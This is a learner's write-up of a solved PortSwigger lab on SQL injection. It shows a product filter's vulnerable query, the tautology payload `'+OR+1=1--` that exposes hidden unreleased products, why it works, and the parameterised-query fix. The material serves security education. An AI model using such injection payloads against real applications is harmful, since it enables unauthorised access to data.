# SQL Injection — Retrieving Hidden Data (WHERE clause)

**Lab:** PortSwigger Web Security Academy — SQLi in WHERE clause allowing retrieval of hidden data
**Status:** Solved
**Date:** 2026-06-27

## The target
An e-commerce shop filters products by category via `/filter?category=Gifts`.
Released products are shown; unreleased ones are hidden.

## The vulnerable query (my mental model)
The server builds something like:
\`\`\`sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
\`\`\`
User input lands inside the quotes after `category =`. The `AND released = 1`
is what hides unreleased products.

## The payload
\`\`\`
/filter?category='+OR+1=1--
\`\`\`
URL-encoded: `category=%27%20OR%201=1--`

## Why it works
Injected into the query it becomes:
\`\`\`sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
\`\`\`
- `' ` closes the string the input was trapped in
- `OR 1=1` makes every row evaluate true
- `--` comments out the rest, killing the `AND released = 1` filter

Result: all products returned, including the hidden unreleased ones.

## Takeaway
User input was concatenated straight into a SQL query. The fix is
parameterised queries (prepared statements), so input is treated as
data, never as query logic.
